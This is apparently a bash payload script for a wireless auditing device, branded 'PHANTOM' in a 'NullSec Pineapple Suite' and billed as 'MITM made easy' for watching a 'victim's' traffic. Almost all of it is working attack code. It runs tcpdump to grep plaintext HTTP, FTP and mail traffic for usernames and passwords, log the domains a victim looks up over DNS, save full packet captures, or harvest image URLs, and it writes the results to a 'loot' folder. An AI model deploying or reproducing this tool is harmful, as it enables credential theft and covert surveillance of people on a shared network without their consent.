#!/bin/bash
#═══════════════════════════════════════════════════════════════════════════════
# PHANTOM - Packet Handler & Network Traffic Observer Module
# Developed by: bad-antics
# 
# Man-in-the-middle packet sniffing - capture everything passing through
#═══════════════════════════════════════════════════════════════════════════════

LOOT_DIR="/mmc/nullsec/phantom"
mkdir -p "$LOOT_DIR"

PROMPT "╔═╗╦ ╦╔═╗╔╗╔╔╦╗╔═╗╔╦╗
╠═╝╠═╣╠═╣║║║ ║ ║ ║║║║
╩  ╩ ╩╩ ╩╝╚╝ ╩ ╚═╝╩ ╩
━━━━━━━━━━━━━━━━━━━━━━━━━
Network Traffic Specter

Sit silently between
victim and gateway.
See ALL their traffic.

MITM made easy.
━━━━━━━━━━━━━━━━━━━━━━━━━
Developed by: bad-antics"

PROMPT "PHANTOM MODES:

1. Credential Sniff
   (HTTP/FTP/etc)

2. DNS Spy
   (What they browse)

3. Full Capture
   (Everything)

4. Image Extraction
   (Pictures only)"

MODE=$(NUMBER_PICKER "Mode (1-4):" 1)
DURATION=$(NUMBER_PICKER "Duration (min):" 5)
DURATION_SEC=$((DURATION * 60))

INTERFACE="wlan0"
LOOT_FILE="$LOOT_DIR/phantom_$(date +%Y%m%d_%H%M%S)"

cat > "${LOOT_FILE}.txt" << EOF
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 PHANTOM - Traffic Intercept Log
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Mode: $MODE
 Duration: ${DURATION} minutes
 Started: $(date)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 NullSec Pineapple Suite | Developed by: bad-antics
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

INTERCEPTED DATA:
EOF

LOG "Phantom materializing..."
SPINNER_START "Intercepting traffic..."

case $MODE in
    1) # Credential sniff
        timeout $DURATION_SEC tcpdump -i $INTERFACE -l -A 'port 80 or port 21 or port 25 or port 110 or port 143' 2>/dev/null | \
        grep -iE 'user|pass|login|pwd|credential|email|auth' >> "${LOOT_FILE}.txt" &
        ;;
    2) # DNS spy
        timeout $DURATION_SEC tcpdump -i $INTERFACE -l 'port 53' 2>/dev/null | \
        grep -oE '[a-zA-Z0-9.-]+\.(com|net|org|io|gov|edu|co)' | sort -u >> "${LOOT_FILE}.txt" &
        ;;
    3) # Full capture
        timeout $DURATION_SEC tcpdump -i $INTERFACE -w "${LOOT_FILE}.pcap" 2>/dev/null &
        ;;
    4) # Image extraction
        timeout $DURATION_SEC tcpdump -i $INTERFACE -l -A 'port 80' 2>/dev/null | \
        grep -oE 'http://[^ ]+\.(jpg|jpeg|png|gif)' >> "${LOOT_FILE}.txt" &
        ;;
esac

sleep $DURATION_SEC

SPINNER_STOP

# Count captures
case $MODE in
    1|2|4) CAPTURES=$(wc -l < "${LOOT_FILE}.txt" 2>/dev/null | awk '{print $1-10}') ;;
    3) CAPTURES=$(du -h "${LOOT_FILE}.pcap" 2>/dev/null | cut -f1) ;;
esac

cat >> "${LOOT_FILE}.txt" << EOF

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 PHANTOM FADED
 Captures: $CAPTURES
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 NullSec Pineapple Suite | Developed by: bad-antics
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
EOF

PROMPT "PHANTOM FADED
━━━━━━━━━━━━━━━━━━━━━━━━━
Traffic capture complete.

Mode: $MODE
Duration: ${DURATION}min
Captures: $CAPTURES

Log: ${LOOT_FILE}.txt
━━━━━━━━━━━━━━━━━━━━━━━━━
Developed by: bad-antics"
